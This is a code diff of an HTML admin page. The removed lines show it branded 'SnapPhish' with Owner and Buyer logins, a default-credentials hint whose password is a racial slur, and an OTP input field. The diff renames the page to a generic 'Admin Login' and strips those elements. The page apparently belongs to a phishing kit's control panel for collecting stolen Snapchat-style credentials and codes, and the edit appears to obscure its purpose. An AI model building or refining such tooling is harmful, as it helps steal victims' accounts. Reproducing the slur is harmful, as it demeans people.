@@ -151,18 +151,6 @@
             color: #FFFC00;
             margin-right: 8px;
         }
-        .otp-input-field {
-            background: #141414;
-            border: 2px solid #2a2a2a;
-            border-radius: 8px;
-            padding: 6px 12px;
-            color: #fff;
-            font-size: 16px;
-            width: 120px;
-            outline: none;
-            margin-right: 8px;
-        }
-        .otp-input-field:focus { border-color: #FFFC00; }
 
         .empty-state {
             text-align: center;
@@ -270,26 +258,6 @@
             cursor: pointer;
         }
         .login-box button:hover { transform: scale(1.02); }
-        .login-box .role-select {
-            display: flex;
-            gap: 12px;
-            justify-content: center;
-            margin-bottom: 16px;
-        }
-        .login-box .role-select button {
-            padding: 8px 24px;
-            border-radius: 10px;
-            border: 2px solid #2a2a2a;
-            background: #121212;
-            color: #fff;
-            cursor: pointer;
-            font-size: 14px;
-            width: auto;
-        }
-        .login-box .role-select button.active {
-            border-color: #FFFC00;
-            background: #1a1a1a;
-        }
 
         .hidden { display: none !important; }
 
@@ -306,17 +274,11 @@
     <!-- ===== LOGIN PAGE ===== -->
     <div id="loginPage">
         <div class="login-box">
-            <h2>🔐 SnapPhish Login</h2>
-            <div class="role-select">
-                <button id="loginOwnerBtn" class="active">Owner</button>
-                <button id="loginBuyerBtn">Buyer</button>
-            </div>
+            <h2>🔐 Admin Login</h2>
             <input type="text" id="loginUser" placeholder="Username" />
             <input type="password" id="loginPass" placeholder="Password" />
             <button onclick="login()">Login →</button>
-            <p style="color:#555;text-align:center;margin-top:12px;font-size:13px;">
-                Owner: owner / nigga
-            </p>
+            <!-- NOTHING ELSE — NO HINTS, NO DEFAULT CREDS -->
         </div>
     </div>
 
@@ -381,28 +343,6 @@
         let currentUsername = '';
 
         // ============================================================
-        // ROLE SELECT (LOGIN)
-        // ============================================================
-        document.getElementById('loginOwnerBtn').addEventListener('click', function() {
-            document.querySelectorAll('.role-select button').forEach(b => b.classList.remove('active'));
-            this.classList.add('active');
-        });
-
-        document.getElementById('loginBuyerBtn').addEventListener('click', function() {
-            document.querySelectorAll('.role-select button').forEach(b => b.classList.remove('active'));
-            this.classList.add('active');
-        });
-
-        // Enter key on login
-        document.getElementById('loginPass').addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') login();
-        });
-
-        document.getElementById('loginUser').addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') document.getElementById('loginPass').focus();
-        });
-
-        // ============================================================
         // LOGIN
         // ============================================================
         async function login() {
@@ -451,6 +391,15 @@
                 alert('Connection error.');
             }
         }
+
+        // Enter key on login
+        document.getElementById('loginPass').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') login();
+        });
+
+        document.getElementById('loginUser').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') document.getElementById('loginPass').focus();
+        });
 
         // ============================================================
         // LOGOUT
@@ -720,7 +669,6 @@
         // ============================================================
         // INIT
         // ============================================================
-        // Show login page by default
         document.getElementById('loginPage').classList.remove('hidden');
         document.getElementById('adminPage').classList.add('hidden');
     </script>
